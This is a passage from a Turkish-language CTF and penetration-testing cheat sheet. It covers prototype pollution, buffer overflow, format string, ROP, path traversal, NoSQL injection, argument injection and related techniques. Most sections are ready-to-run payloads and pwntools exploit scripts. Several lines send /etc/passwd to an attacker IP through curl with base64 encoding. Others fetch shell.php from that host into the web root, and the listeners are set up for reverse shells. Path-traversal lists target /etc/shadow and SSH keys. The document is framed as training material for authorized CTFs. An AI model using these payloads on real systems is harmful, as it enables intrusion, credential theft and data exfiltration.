# 1. redirect_uri doğrulamasını test et
# redirect_uri'yi yavaş yavaş değiştir, ne zaman kabul ediyor?

# 2. state parametresi var mı kontrol et
# Yoksa → CSRF ile account takeover dene

# 3. Token nerede gidiyor? (Burp ile izle)
# URL fragment mı? Body mi? Header mı?
```

---

---

# 10 — Prototype Pollution

## 1. Teknik Adı ve Sınıflandırma
- **Tip:** CWE-1321 — Improperly Controlled Modification of Object Prototype Attributes
- **Dil:** JavaScript (Node.js backend veya tarayıcı)
- **Etki:** RCE (server-side), XSS (client-side), Logic Bypass

## 2. Mental Model

```javascript
// JavaScript'te her nesnenin şablonu var:
let obj = {};
obj.__proto__.isAdmin = true;

let obj2 = {};
console.log(obj2.isAdmin); // → true (şablon kirletildi!)
```

## 4. Exploitation

### Client-Side → XSS

```javascript
// URL: ?__proto__[innerHTML]=<img src=x onerror=alert(1)>
// veya JSON: {"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}
```

### Server-Side → RCE (Node.js)

```javascript
// child_process.exec() öncesinde options.env kontrol ediliyorsa:
{"__proto__":{"env":{"NODE_OPTIONS":"--require /proc/self/fd/0"}}}

// Daha doğrudan (lodash.merge kullanıyorsa):
{"__proto__":{"execArgv":["--eval","require('child_process').exec('id|curl http://SENIN_IP/?x=$(cat /etc/passwd|base64)')"]}}
```

## 7. Checklist — 3 Komut

```bash
# 1. JSON input'ta proto test et
curl https://hedef.com/api -H "Content-Type: application/json" \
  -d '{"__proto__":{"polluted":true}}'

# 2. URL param test:
curl "https://hedef.com/?__proto__[polluted]=true"

# 3. RCE payload (Node.js):
curl https://hedef.com/api -d '{"__proto__":{"execArgv":["--eval","require(\"child_process\").exec(\"id>>/tmp/p\")"]}}'
```

---

---

# 11 — Buffer Overflow (Stack-Based)

## 1. Teknik Adı ve Sınıflandırma
- **Tip:** CWE-121 — Stack-Based Buffer Overflow
- **Alt Tipler:** EIP Overwrite, Return Address, ROP Chain
- **Etki:** RCE, Privilege Escalation, Arbitrary Code Execution

## 2. Mental Model

```
Stack bellekte şöyle görünür:
[yerel değişkenler] [kayıtlı register'lar] [return address] [argümanlar]

Buffer 10 byte, sen 20 byte yazarsan:
[AAAAAAAAAA][AAAAAAAAAA] → return address üzerine yazıldı
Program return ettiğinde → senin yazdığın adrese atlar → shellcode çalışır
```

## 4. Exploitation

```python
from pwn import *

# Adım 1: Offset bul (EIP'nin kaçıncı byte'ta üzerine yazıldığını bul)
pattern = cyclic(200)  # pwntools cyclic pattern

# GDB'de crash yeri:
# EIP = 0x61616161 ise:
offset = cyclic_find(0x61616161)

# Adım 2: Payload oluştur
payload = b'A' * offset  # padding
payload += p32(0xdeadbeef)  # yeni return address (little-endian)
payload += b'\x90' * 16  # NOP sled
payload += shellcode  # shellcode

# Adım 3: Gönder
p = remote('hedef.com', 1337)
p.sendlineafter('Input: ', payload)
p.interactive()
```

## 5. Bypass Teknikleri

```bash
# ASLR bypass: ret2libc
# NX bypass: ROP chain
# Stack canary bypass: format string leak veya brute force

# libc base adresini bul:
# puts@GOT → puts@libc adresi → base = puts@libc - puts_offset
```

## 7. Checklist — 3 Komut

```bash
# 1. Binary analiz
checksec --file=./binary  # NX, ASLR, PIE, Canary kontrol

# 2. Fuzzing
python3 -c "print('A'*200)" | ./binary  # Crash var mı?

# 3. GDB ile offset bul
gdb ./binary
run <<< $(python3 -c "from pwn import *; print(cyclic(200).decode())")
# EIP değerini al, cyclic_find() ile offset hesapla
```

---

---

# 12 — Format String Vulnerability

## 1. Teknik Adı ve Sınıflandırma
- **Tip:** CWE-134 — Use of Externally-Controlled Format String
- **Etki:** Bellek Okuma (stack leak, libc adresi), Bellek Yazma (arbitrary write), RCE

## 2. Mental Model

```c
// TEHLİKELİ:
printf(user_input);  // format string olarak kullanılıyor!

// Girdin: %x.%x.%x.%x
// Çıktı: stack'teki değerleri hex olarak basar
// Girdin: %s → segfault (stack'teki pointer'ı string olarak okumaya çalışır)
// Girdin: %n → kaç karakter basıldığını BELLEĞİN bir yerine YAZAR
```

## 4. Exploitation

```python
from pwn import *

p = remote('hedef.com', 1337)

# Stack'i oku (libc adresi leak)
p.sendline(b'%1$p.%2$p.%3$p.%4$p.%5$p.%6$p')
# Her %X$p → stack'in X. pozisyonunu yazdırır

# Arbitrary write (%n ile):
# printf, %n'den önceki karakter sayısını belirtilen adrese yazar
# Örnek: 0x1234 adresine 0x41 yaz:
payload = fmtstr_payload(offset, {target_addr: value})
```

## 7. Checklist — 3 Komut

```bash
# 1. Format string var mı test et
echo "%x.%x.%x.%x" | nc hedef.com 1337

# 2. Stack pozisyonlarını bul
python3 -c "print('%' + str(i) + '$p' for i in range(1,50))"

# 3. pwntools ile exploit
python3 -c "from pwn import *; print(fmtstr_payload(6, {0x804a028: 0x1337}))"
```

---

---

# 13 — Use-After-Free (UAF)

## 1. Teknik Adı ve Sınıflandırma
- **Tip:** CWE-416 — Use After Free
- **Etki:** RCE, Privilege Escalation, Kernel exploits

## 2. Mental Model

```c
char *ptr = malloc(10);  // bellek ayır
free(ptr);               // belleği serbest bırak
strcpy(ptr, user_input); // HATA: serbest bırakılmış belleği kullan!

// Saldırgan: free() sonrası o belleği başka bir nesne ile doldurur
// Sonra program o ptr'ı kullanmaya devam eder → başka nesnenin içindeki kodu çalıştırır
```

## 7. Checklist — 3 Komut

```bash
# 1. Binary'i valgrind ile çalıştır (UAF tespit)
valgrind --tool=memcheck ./binary

# 2. ASAN ile derle ve test et
gcc -fsanitize=address -o binary_asan source.c
./binary_asan

# 3. Heap spray dene
python3 -c "print('A'*64 + 'B'*64 + 'C'*64)" | ./binary
```

---

---

# 14 — Return-Oriented Programming (ROP)

## 1. Teknik Adı ve Sınıflandırma
- **Tip:** NX Bypass Tekniği
- **Amaç:** Shellcode çalıştırılamıyorsa (NX/DEP), zaten var olan kod parçalarını (gadget) zincirleme

## 2. Mental Model

```
NX: Stack'e yazdığın shellcode çalıştırılamaz (Non-Executable)
ROP: Ama programın içindeki mevcut kod parçaları (gadget) zaten çalışıyor!
Gadget: "ret" ile biten küçük asm kod parçaları

pop rdi; ret      ← fonksiyon argümanı ayarla
pop rsi; ret      ← ikinci argüman
call system       ← system() çağır
```

## 4. Exploitation

```python
from pwn import *
from ropper import RopChain

binary = ELF('./binary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(binary)

# Adım 1: Gadget bul
rop.find_gadget(['pop rdi', 'ret'])

# Adım 2: /bin/sh string'ini bul
bin_sh = next(libc.search(b'/bin/sh'))

# Adım 3: Chain oluştur
rop.raw(rop.find_gadget(['ret'])[0])  # stack alignment
rop.raw(rop.find_gadget(['pop rdi', 'ret'])[0])
rop.raw(bin_sh)
rop.raw(libc.sym['system'])

payload = b'A' * offset + rop.chain()
```

## 7. Checklist — 3 Komut

```bash
# 1. Gadget bul
ROPgadget --binary ./binary | grep "pop rdi"

# 2. libc fonksiyon offset'lerini bul
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " system"

# 3. /bin/sh string'ini bul
strings -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
```

---

---

# 15 — Path Traversal / Directory Traversal

## 1. Teknik Adı ve Sınıflandırma
- **Tip:** CWE-22
- **Etki:** Kaynak Kod Okuma, Credential Çalma, Config Dosyaları

## 4. Exploitation

```bash
# Temel:
?file=../../../../etc/passwd

# Double encoding:
?file=..%2F..%2F..%2Fetc%2Fpasswd

# 16-bit Unicode:
?file=..%c0%af../etc/passwd

# Null byte:
?file=../../../etc/passwd%00.jpg

# Hedef dosyalar:
/etc/passwd
/etc/shadow
/etc/hosts
~/.ssh/id_rsa
/var/www/html/config.php
/.env
/app/.env
/proc/self/environ
/proc/self/cmdline
```

## 7. Checklist — 3 Komut

```bash
curl "https://hedef.com/file?name=../../../../etc/passwd"
curl "https://hedef.com/file?name=..%2F..%2F..%2Fetc%2Fpasswd"
curl "https://hedef.com/file?name=....//....//....//etc/passwd"
```

---

---

# 16 — Race Condition (TOCTOU)

## 1. Teknik Adı ve Sınıflandırma
- **Tip:** CWE-367 — Time-of-Check Time-of-Use Race Condition
- **Etki:** Privilege Escalation, Double Spend, Authentication Bypass

## 2. Mental Model

```
TOCTOU: Time of Check vs Time of Use

1. Sistem kontrol eder: "Bu kullanıcının bakiyesi 100$ mı?" → Evet
2. [MİLİSANİYELER ARALIĞI]
3. Sistem işlem yapar: "100$ çek"

Sen 2. adımda aynı anda iki istek gönderirsen → iki kez 100$ çekebilirsin (bakiye bir kez kontrol edildi)
```

## 4. Exploitation

```python
import threading, requests

def send_request():
    requests.post('https://hedef.com/transfer', data={'amount': 100, 'to': 'attacker'})

# 50 thread aynı anda gönder
threads = [threading.Thread(target=send_request) for _ in range(50)]
for t in threads: t.start()
for t in threads: t.join()

# Burp Suite ile: Turbo Intruder → race condition template
```

## 7. Checklist — 3 Adım

```bash
# 1. Kritik işlem tespiti (bakiye, kupon, tek kullanımlık token)
# 2. Burp'ta "Send to Turbo Intruder" → race condition script
# 3. 50-100 paralel istek at, sonucu karşılaştır
```

---

---

# 17 — NoSQL Injection

## 1. Teknik Adı ve Sınıflandırma
- **Tip:** CWE-943 — Improper Neutralization of Special Elements in Data Query Logic
- **Hedef:** MongoDB, CouchDB, Redis
- **Etki:** Authentication Bypass, Data Exfiltration

## 4. Exploitation

```javascript
// MongoDB authentication bypass
// Normal sorgu: db.users.findOne({username: "admin", password: "test"})
// Senin girdin:
{"username": "admin", "password": {"$gt": ""}}
// $gt: "" → şifresi boş string'den büyük olan her kayıt → hepsi → bypass!

// URL encoded form olarak:
username=admin&password[$gt]=

// Operatörler:
$gt, $gte, $lt, $lte → karşılaştırma
$ne → eşit değil → tüm kullanıcılar
$regex → regex match
$where → JavaScript çalıştır!

// $where ile RCE (eski MongoDB):
{"$where": "sleep(5000)"}  // time-based blind
{"$where": "return this.password.match(/^a/)"}  // karakter karakter kır
```

## 7. Checklist — 3 Komut

```bash
# 1. Auth bypass
curl -X POST https://hedef.com/login -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$gt":""}}'

# 2. URL encoded
curl -X POST https://hedef.com/login -d "username=admin&password[$ne]=wrongpass"

# 3. Regex ile enumeration
curl -X POST https://hedef.com/login -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$regex":"^a"}}'
```

---

---

# 18 — DNS Rebinding

## 1. Teknik Adı ve Sınıflandırma
- **Tip:** Same-Origin Policy Bypass via DNS
- **Etki:** İç Ağa Erişim, SSRF Bypass, Metadata API Erişimi

## 2. Mental Model

```
1. Saldırgan kendi domain'ini kontrol ediyor: evil.com
2. Kurban evil.com'a istek yapar → DNS: "IP = 1.2.3.4 (attacker server)"
3. Tarayıcı JavaScript yükler
4. JavaScript bir sonraki istekte evil.com'a bakar
5. Bu sefer DNS: "IP = 127.0.0.1" (kısa TTL ile değiştirildi!)
6. Tarayıcı Same-Origin Policy gereği evil.com'a istek yapar
7. Ama artık evil.com = 127.0.0.1 → İç ağa erişim!
```

## 7. Checklist — 3 Adım

```bash
# 1. rbndr.us veya singularity kullan (DNS rebinding araçları)
# 2. Hedef internal servis portunu belirle
# 3. Rebinding ile SSRF bypass yap
```

---

---

# 19 — Padding Oracle Attack

## 1. Teknik Adı ve Sınıflandırma
- **Tip:** CWE-649 — Reliance on Obfuscation or Encryption
- **Şifreleme:** AES-CBC, DES-CBC
- **Etki:** Şifreli veriyi okuma, yeni geçerli şifreli veri üretme (Authentication Bypass)

## 2. Mental Model

CBC şifreleme, her blok şifresini bir önceki şifreli bloğa XOR eder. Şifre çözümde hata verirse sunucu "Invalid padding" diyor. Bu mesaj bir oracle — seninle konuşuyor.

```
Padding doğru mu? → Evet/Hayır
Bu iki bilgiyle → her byte'ı brute force edebilirsin
256 deneme x N byte = orijinal plaintext!
```

## 4. Exploitation

```bash
# padbuster ile:
padbuster https://hedef.com/view?data=SIFRELI_DATA SIFRELI_DATA 8 -encoding 0

# python-paddingoracle:
python3 paddingoracle.py --ciphertext "BASE64" --url "https://hedef.com/view?data={cipher}"
```

## 7. Checklist — 3 Komut

```bash
# 1. Şifreli cookie veya parametre bul (CBC/ECB?)
echo "COOKIE" | base64 -d | xxd  # Blok boyutu 8 veya 16?

# 2. Padding hatası mesajı var mı?
# Farklı değerler gönder, farklı hata mesajları alıyor musun?

# 3. padbuster ile decrypt
padbuster https://hedef.com/ COOKIE 16 -encoding 0
```

---

---

# 20 — Argument Injection

## 1. Teknik Adı ve Sınıflandırma
- **Tip:** CWE-88 — Argument Injection
- **Hedefler:** Telnet, SSH, curl, wget, git, rsync, ffmpeg, imagemagick
- **Etki:** Authentication Bypass, RCE, Dosya Okuma

## 2. Mental Model

```bash
# Sistem: "Kullanıcı adını gir"
# Çalışan komut: login [kullanıcı_adı]
# Senin girdin: -f root
# Çalışan komut: login -f root
# "-f" = force, parola sorma → root erişimi!

# Başka örnek - curl:
curl $user_input  # sen girdin: --output /var/www/html/shell.php http://evil.com/shell.php
```

## 4. Exploitation

```bash
# Telnet / login:
Kullanıcı adı: -f root

# curl wrapper:
--output /var/www/html/shell.php http://SENIN_IP/shell.php

# wget:
-O /var/www/html/shell.php http://SENIN_IP/shell.php

# git:
--upload-pack=id  # RCE

# rsync:
-e "ssh -o ProxyCommand=id"

# ffmpeg:
-i "http://SENIN_IP/evil.m3u8"  # SSRF
```

## 7. Checklist — 3 Komut

```bash
# 1. Hangi binary çalıştırılıyor?
strace ./binary 2>&1 | grep exec

# 2. Argüman olarak parametre enjekte et
telnet hedef.com 23
# login: -f root

# 3. Farklı program parametrelerini dene
# --help --version -v --debug (error mesajları binary'i açığa çıkarır)
```

---

---

# Evrensel CTF Metodolojisi

```
╔══════════════════════════════════════════════════════╗
║              CTF SALDIRI AKIŞI                       ║
╠══════════════════════════════════════════════════════╣
║                                                      ║
║  1. RECON                                            ║
║     nmap -sV -sC -p- hedef                           ║
║     whatweb / wappalyzer (teknoloji stack)           ║
║     gobuster / ffuf (dizin bruteforce)               ║
║                                                      ║
║  2. FINGERPRINT → ZAFIYET EŞLEŞTİR                   ║
║     Port 23  → Argument Injection                    ║
║     Port 80  → SQLi, SSTI, XXE, LFI, SSRF           ║
║     Port 443 → JWT, OAuth, Deserialization           ║
║     Port 5678 → n8n Sandbox Escape                  ║
║     Binary   → BOF, Format String, UAF, ROP         ║
║                                                      ║
║  3. EXPLOIT                                          ║
║     Önce zararsız test: id, whoami, sleep 5          ║
║     Sonra asıl payload                               ║
║                                                      ║
║  4. DOĞRULA                                          ║
║     0 byte mi? Blind mı? OOB gerekli mi?             ║
║     Çıktı nerede? (stdout / dosya / DNS / HTTP)      ║
║                                                      ║
║  5. FLAG BULMAK                                      ║
║     find / -name "*flag*" 2>/dev/null                ║
║     find / -name "*secret*" 2>/dev/null              ║
║     ls /root/ /home/*/                               ║
║     cat ~/.bash_history (ipucu!)                     ║
╚══════════════════════════════════════════════════════╝
```

---

## OOB (Out-of-Band) Evrensel Araç Seti

```bash
# 1. Netcat dinleyici
nc -lvnp 8080

# 2. Python HTTP server
python3 -m http.server 8080

# 3. interactsh (DNS+HTTP OOB)
interactsh-client
# → xyz.oast.fun adresi alırsın, tüm hit'leri loglar

# 4. Burp Collaborator
# Burp Suite Pro → Collaborator → Copy payload URL

# 5. Base64 ile veri çek
curl http://SENIN_IP:8080/?x=$(cat /etc/passwd | base64 -w0)
# Gelen base64: echo "BASE64" | base64 -d
```

---

## Terminal Hazırlık (CTF Başlamadan Önce)

```bash
# Dinleyicileri hazırla
nc -lvnp 4444 &   # reverse shell
nc -lvnp 8080 &   # OOB HTTP
python3 -m http.server 9090 &  # payload serve et

# IP adresini not et
ip addr | grep "inet " | grep -v 127

# Temel araçları kontrol et
which sqlmap gobuster ffuf nmap burpsuite pwndbg ysoserial
```

---

## Zafiyet → Araç Hızlı Referans

| Zafiyet | Ana Araç | Yedek Araç |
|---|---|---|
| SQLi | sqlmap | manual + burp |
| SSTI | tplmap | manual payload |
| XXE | Burp Suite | manual curl |
| Deserialization Java | ysoserial | manual |
| Deserialization Python | manual pickle | |
| JWT | jwt_tool | hashcat |
| Web Fuzzing | ffuf | gobuster |
| Port Scan | nmap | masscan |
| Binary PWN | pwntools | GDB + peda |
| OOB | interactsh | burp collaborator |
| ROP | ROPgadget | pwntools ROP |

---

## Flag Formatları ve Nerede Aranır

```bash
# Format tespiti:
grep -r "CTF{" / 2>/dev/null
grep -r "flag{" / 2>/dev/null
grep -r "FLAG{" / 2>/dev/null
grep -rE "[A-Z0-9]{32}" / 2>/dev/null  # MD5 hash formatı

# Gizli yerler:
cat /etc/passwd | grep -v nologin  # kullanıcı listesi
cat /etc/crontab  # zamanlanmış görevler
env  # çevre değişkenleri (API key, flag!)
cat /proc/self/environ  # process çevre değişkenleri
find / -perm -4000 2>/dev/null  # SUID binary'ler
```

---

*Bu doküman eğitim ve CTF yarışmaları içindir. Yalnızca izin alınmış sistemlerde uygulayın.*

*Her zafiyet için altın kural: "Bu sistem hangi varsayım üzerine kurulu? Ben ne girersem bu varsayımı bozarım?"*